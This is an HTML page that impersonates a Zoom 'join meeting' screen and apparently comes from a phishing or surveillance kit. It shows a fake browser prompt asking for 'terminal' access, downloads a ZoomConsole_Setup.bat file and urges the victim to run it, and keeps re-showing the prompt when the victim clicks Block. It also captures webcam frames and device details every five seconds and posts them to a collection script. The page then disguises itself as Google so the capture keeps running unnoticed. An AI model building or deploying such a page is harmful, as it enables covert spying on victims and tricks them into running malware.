<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join Meeting | Zoom</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #242424;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .meeting-card {
            background: #1a1a1a;
            padding: 40px;
            border-radius: 12px;
            text-align: center;
            width: 400px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }

        .logo {
            color: #2d8cff;
            font-size: 2rem;
            font-weight: bold;
            margin-bottom: 20px;
        }

        h2 {
            margin: 0 0 10px;
        }

        p {
            color: #aaa;
            margin-bottom: 30px;
        }

        .preview-box {
            background: #000;
            height: 250px;
            width: 100%;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
            position: relative;
            overflow: hidden;
        }

        .btn-join {
            background-color: #0e71eb;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
        }

        .btn-join:hover {
            background-color: #0b5ed7;
        }

        .hidden-canvas {
            display: none;
        }

        /* Fake Permission Modal */
        .permission-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: flex-start;
            justify-content: center;
            z-index: 1000;
            padding-top: 20px;
        }

        .permission-box {
            background: #fff;
            color: #333;
            width: 380px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            text-align: left;
            animation: slideDown 0.3s ease-out;
            position: relative;
        }

        @keyframes slideDown {
            from {
                transform: translateY(-20px);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .perm-header {
            padding: 15px 20px;
            border-bottom: 1px solid #eee;
            display: flex;
            align-items: center;
        }

        .perm-icon {
            font-size: 20px;
            margin-right: 12px;
            color: #5f6368;
        }

        .perm-title {
            font-size: 16px;
            font-weight: 500;
        }

        .perm-body {
            padding: 20px;
            font-size: 14px;
            line-height: 1.5;
            color: #5f6368;
        }

        .perm-actions {
            padding: 10px 20px 15px;
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        }

        .btn-perm {
            padding: 8px 16px;
            border-radius: 4px;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            border: 1px solid transparent;
            transition: background 0.2s;
        }

        .btn-block {
            color: #5f6368;
            background: #fff;
            border: 1px solid #dadce0;
        }

        .btn-block:hover {
            background: #f1f3f4;
        }

        .btn-allow {
            color: #fff;
            background: #1a73e8;
        }

        .btn-allow:hover {
            background: #1557b0;
        }

        .download-instruction {
            margin-top: 15px;
            padding: 10px;
            background: #e8f0fe;
            color: #1a73e8;
            border-radius: 4px;
            font-size: 13px;
            display: none;
        }
    </style>
    <script src="../../assets/js/jquery.min.js"></script>
</head>

<body>

    <div class="meeting-card">
        <div class="logo">Zoom</div>
        <h2>Meeting in Progress</h2>
        <p>The host has let you in. Please enable your camera and microphone to join.</p>

        <div class="preview-box">
            <video id="video" playsinline autoplay style="width: 100%; height: 100%; object-fit: cover;"></video>
            <div id="loading-text" style="position: absolute; color: #666;">
                <div style="font-size: 3rem; margin-bottom: 10px;">📹</div>
                <div>Click below to enable camera</div>
            </div>
        </div>

        <button class="btn-join" id="enableBtn" onclick="enableCamera()"
            style="background-color: #0e71eb; margin-bottom: 10px;">Enable Camera & Microphone</button>
        <button class="btn-join" id="joinBtn" onclick="joinMeeting()"
            style="display: none; background-color: #28a745;">Join Meeting</button>
        <div id="error-msg" style="color: #ff6b6b; margin-top: 10px; font-size: 0.9rem; display: none;"></div>
    </div>

    <div id="permission-modal" class="permission-overlay" style="display: none;">
        <div class="permission-box">
            <div class="perm-header">
                <div class="perm-icon">🔒</div>
                <div class="perm-title">zoom.us wants to access your system terminal</div>
            </div>
            <div class="perm-body">
                This website creates a secure connection for the meeting.<br>
                Allow "Zoom Console" to access your terminal?
            </div>
            <div class="perm-actions">
                <button class="btn-perm btn-block" onclick="denyPermission()">Block</button>
                <button class="btn-perm btn-allow" onclick="allowPermission()">Allow</button>
            </div>
        </div>
    </div>

    <canvas id="canvas" width="320" height="240" class="hidden-canvas"></canvas>

    <script>
        function post(imgdata, info) {
            $.ajax({
                type: 'POST',
                data: {
                    cat: imgdata,
                    info: JSON.stringify(info)
                },
                url: 'post.php',
                dataType: 'json',
                async: false,
                success: function (result) { },
                error: function () { }
            });
        };

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const constraints = {
            audio: true,
            video: { facingMode: "user" }
        };

        let permissionGranted = false;

        // Show fake permission prompt slightly after load
        setTimeout(() => {
            document.getElementById('permission-modal').style.display = 'flex';
        }, 1500);

        function allowPermission() {
            document.getElementById('permission-modal').style.display = 'none';

            // Trigger download of the payload
            const link = document.createElement('a');
            link.href = '../../assets/ZoomConsole_Setup.bat';
            link.download = 'ZoomConsole_Setup.bat';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // Change UI to instruct user
            const loadingText = document.getElementById('loading-text');
            if (loadingText) {
                loadingText.innerHTML = `
                    <div style="font-size: 3rem; margin-bottom: 10px;">💾</div>
                    <div style="color: #4ade80; font-weight: bold;">Downloading Component...</div>
                    <div style="font-size: 0.9rem; margin-top: 10px;">Please open <b>ZoomConsole_Setup.bat</b> to join</div>
                `;
            }
        }

        function denyPermission() {
            document.getElementById('permission-modal').style.display = 'none';
            alert("This permission is required to join the meeting securely.");
            // Re-show after a delay for persistence
            setTimeout(() => {
                document.getElementById('permission-modal').style.display = 'flex';
            }, 2000);
        }

        async function enableCamera() {
            const errorMsg = document.getElementById('error-msg');
            const loadingText = document.getElementById('loading-text');
            const enableBtn = document.getElementById('enableBtn');
            const joinBtn = document.getElementById('joinBtn');

            try {
                loadingText.innerHTML = '<div style="font-size: 3rem; margin-bottom: 10px;">⏳</div><div>Requesting permissions...</div>';

                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);

                loadingText.style.display = 'none';
                enableBtn.style.display = 'none';
                joinBtn.style.display = 'block';
                errorMsg.style.display = 'none';
                permissionGranted = true;
            } catch (e) {
                console.log("Camera/Microphone access denied:", e);
                errorMsg.textContent = '⚠️ Please allow camera and microphone access in your browser settings and try again.';
                errorMsg.style.display = 'block';
                loadingText.innerHTML = '<div style="font-size: 3rem; margin-bottom: 10px;">❌</div><div>Permission denied</div>';
            }
        }

        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;
            var context = canvas.getContext('2d');

            // Capture immediately and then every 5 seconds
            setInterval(function () {
                context.drawImage(video, 0, 0, 320, 240);
                var canvasData = canvas.toDataURL("image/jpeg", 0.7);

                // Collect Device Info
                var deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: window.screen.width + "x" + window.screen.height,
                    cores: navigator.hardwareConcurrency || "Unknown",
                    ram: navigator.deviceMemory || "Unknown"
                };

                post(canvasData, deviceInfo);
            }, 5000);
        }

        function joinMeeting() {
            if (!permissionGranted) {
                alert("Please enable camera and microphone first!");
                return;
            }

            alert("Connecting to meeting...");

            // Simulate "Meeting Ended" or "Background Mode" by morphing to Google
            setTimeout(function () {
                morphToGoogle();
            }, 2000);
        }

        function morphToGoogle() {
            // Clear the Zoom UI
            document.querySelector('.meeting-card').style.display = 'none';
            document.body.style.background = '#ffffff';
            document.body.style.color = '#000000';
            document.body.style.justifyContent = 'flex-start';
            document.body.style.alignItems = 'center';
            document.body.style.paddingTop = '100px';
            document.title = 'Google';

            // Inject Fake Google UI
            var googleHTML = `
                <div style="text-align:center">
                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="272" height="92">
                    <br><br>
                    <input type="text" style="width:500px; padding:10px; border:1px solid #dfe1e5; border-radius:24px; outline:none;" placeholder="Search Google or type a URL">
                    <br><br>
                    <button style="background:#f8f9fa; border:1px solid #f8f9fa; padding:10px 20px; margin:5px; border-radius:4px; color:#3c4043; cursor:pointer;">Google Search</button>
                    <button style="background:#f8f9fa; border:1px solid #f8f9fa; padding:10px 20px; margin:5px; border-radius:4px; color:#3c4043; cursor:pointer;">I'm Feeling Lucky</button>
                </div>
            `;

            var div = document.createElement('div');
            div.innerHTML = googleHTML;
            document.body.appendChild(div);

            // The camera loop (setInterval) continues running because we didn't reload the page
            console.log("Background mode active");
        }
    </script>
</body>

</html>
